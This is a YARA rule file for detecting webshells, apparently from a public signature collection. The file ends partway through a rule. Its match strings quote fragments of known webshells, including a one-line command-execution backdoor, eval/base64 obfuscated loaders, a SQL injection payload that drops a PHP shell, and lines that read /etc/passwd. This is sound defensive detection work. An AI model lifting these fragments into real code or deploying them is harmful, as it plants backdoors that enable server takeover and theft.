rule Webshell_HYTop_DevPack_2005_RID309D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")" 
      $s8 = "scrollbar-darkshadow-color:#9C9CD3;" 
      $s9 = "scrollbar-face-color:#E4E4F3;" 
   condition: 
      all of them
}

rule Webshell_down_rar_Folder_down_RID32D4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file down.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &" 
   condition: 
      all of them
}

rule Webshell_cmdShell_ASP_RID2F15 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file cmdShell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if cmdPath=\"wscriptShell\" then" 
   condition: 
      all of them
}

rule Webshell_HYTop2006_rar_Folder_2006_RID32C8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "strBackDoor = strBackDoor " 
   condition: 
      all of them
}

rule Webshell_r57shell_3_RID2E2E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<b>\".$_POST['cmd']" 
   condition: 
      all of them
}

rule Webshell_FSO_s_ajan_2_RID2EEA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")" 
      $s3 = "/file.zip" 
   condition: 
      all of them
}

rule Simple_PHP_BackDooR_RID2E06 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Simple_PHP_BackDooR_RID2E06.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he" 
      $s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn" 
      $s9 = "// a simple php backdoor" 
   condition: 
      1 of them
}

rule Webshell_HYTop_DevPack_2005Red_RID31B8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005Red.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "scrollbar-darkshadow-color:#FF9DBB;" 
      $s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace" 
      $s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)" 
   condition: 
      all of them
}

rule Webshell_FSO_s_RemExp_RID2F10 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser" 
      $s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F" 
      $s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_2005_RID34AB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp" 
      $s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">" 
   condition: 
      all of them
}

rule WebShell_hiddens_shell_v1_RID30E2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file hiddens shell v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U" 
   condition: 
      all of them
}

rule WebShell_Uploader_RID2DC2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Uploader.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
   condition: 
      all of them
}

rule WebShell_php_webshells_README_RID3203 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file README.md"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
      $s1 = "php-webshells" fullword
   condition: 
      all of them
}

rule WebShell_accept_language_RID3099 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file accept_language.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
   condition: 
      all of them
}

rule WebShell_mysql_tool_Apr14_RID30C0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file mysql_tool.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:53:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-01-29"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
      $s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_HYTop_DevPack_fso_RID311E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file fso.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<!-- PageFSO Below -->" 
      $s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_ssh_RID3532 : DEMO FILE T1021_004 T1505_003 WEBSHELL {
   meta:
      description = "Webshells PHP Webshell - file ssh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 16:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1021_004, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "eval(gzinflate(str_rot13(base64_decode('" 
   condition: 
      all of them
}

rule thelast_orice2_RID2CA9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file orice2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = " $aa = $_GET['aa'];" 
      $s1 = "echo $aa;" 
   condition: 
      all of them
}

rule FSO_s_sincap_RID2BA8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file sincap.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">" 
      $s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin=" 
   condition: 
      all of them
}

rule Webshell_PhpShell_1_RID2E56 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PhpShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>." 
   condition: 
      all of them
}

rule Webshell_HYTop_DevPack_config_RID324C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file config.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "const adminPassword=\"" 
      $s2 = "const userPassword=\"" 
      $s3 = "const mVersion=" 
   condition: 
      all of them
}

rule Webshell_FSO_s_zehir4_RID2F15 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = " byMesaj " 
   condition: 
      all of them
}

rule Webshell_iMHaPFtp_RID2D7F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">" 
   condition: 
      all of them
}

rule Webshell_FSO_s_reader_RID2F32 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file reader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "mailto:mailbomb@hotmail." 
   condition: 
      all of them
}

rule Webshell_KA_uShell_RID2DFE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file KA_uShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass" 
      $s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" 
   condition: 
      all of them
}

rule Webshell_PHP_Backdoor_v1_RID3018 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP Backdoor v1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th" 
      $s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy" 
   condition: 
      all of them
}

rule HYTop_DevPack_server_RID2ED8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file server.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<!-- PageServer Below -->" 
   condition: 
      all of them
}

rule saphpshell_RID2B45 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file saphpshell_RID2B45.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 08:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>" 
   condition: 
      all of them
}

rule Webshell_admin_ad_RID2DD3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file admin-ad.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz" 
      $s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><" 
   condition: 
      all of them
}

rule Webshell_FSO_s_casus15_RID2F44 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))" 
   condition: 
      all of them
}

rule WebShell_toolaspshell_RID2FA0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file toolaspshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef" 
      $s1 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
      $s2 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
   condition: 
      2 of them
}

rule WebShell_b374k_mini_shell_php_php_RID33C2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 15:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "@error_reporting(0);" fullword
      $s2 = "@eval(gzinflate(base64_decode($code)));" fullword
      $s3 = "@set_time_limit(0); " fullword
   condition: 
      all of them
}

rule WebShell_Sincap_1_0_RID2E03 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Sincap 1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
      $s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
      $s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
      $s12 = "while (($ekinci=readdir ($sedat))){" fullword
      $s19 = "$deger2= \"$ich[$tampon4]\";" fullword
   condition: 
      2 of them
}

rule WebShell_b374k_php_RID2D98 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file b374k.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
      $s6 = "// password (default is: b374k)" 
      $s8 = "//******************************************************************************" 
      $s9 = "// b374k 2.2" fullword
      $s10 = "eval(\"?>\".gzinflate(base64_decode(" 
   condition: 
      3 of them
}

rule WebShell_php_webshells_MyShell_RID3313 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file MyShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "<title>MyShell error - Access Denied</title>" fullword
      $s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
      $s5 = "//A workdir has been asked for - we chdir to that dir." fullword
      $s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
      $s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
      $s19 = "#every command you excecute." fullword
      $s20 = "<form name=\"shell\" method=\"post\">" fullword
   condition: 
      3 of them
}

rule WebShell_php_webshells_pHpINJ_RID325E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file pHpINJ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
      $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
      $s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN" 
      $s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
      $s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
      $s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
      $s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
   condition: 
      1 of them
}

rule WebShell_c99_locus7s_RID2E8A : DEMO T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file c99_locus7s.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
      $s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y" 
      $s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq" 
      $s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
      $s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
   condition: 
      2 of them
}

rule WebShell_JspWebshell_1_2_RID300A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s1 = "String password=request.getParameter(\"password\");" fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s7 = "String editfile=request.getParameter(\"editfile\");" fullword
      $s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
      $s12 = "password = (String)session.getAttribute(\"password\");" fullword
   condition: 
      3 of them
}

rule WebShell_STNC_WebShell_v0_8_RID30CF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
      $s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()" 
      $s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw" 
   condition: 
      2 of them
}

rule WebShell_Web_shell__c_ShAnKaR_RID3203 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
      $s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump" 
      $s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
      $s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
   condition: 
      2 of them
}

rule WebShell_Gamma_Web_Shell_RID303D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
      $s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
      $s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
      $s20 = "my $command = $self->query('command');" fullword
   condition: 
      2 of them
}

rule WebShell_php_webshells_aspydrv_RID335E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aspydrv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files" 
      $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
      $s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
      $s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
      $s20 = "' ---Copy Too Folder routine Start" fullword
   condition: 
      3 of them
}

rule WebShell_JspWebshell_1_2_2_RID309B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
      $s15 = "endPoint=random1.getFilePointer();" fullword
      $s20 = "if (request.getParameter(\"command\") != null) {" fullword
   condition: 
      3 of them
}

rule WebShell_php_include_w_shell_RID325E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file php-include-w-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
      $s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
      $s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
   condition: 
      1 of them
}

rule WebShell_ZyklonShell_RID2F05 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file ZyklonShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
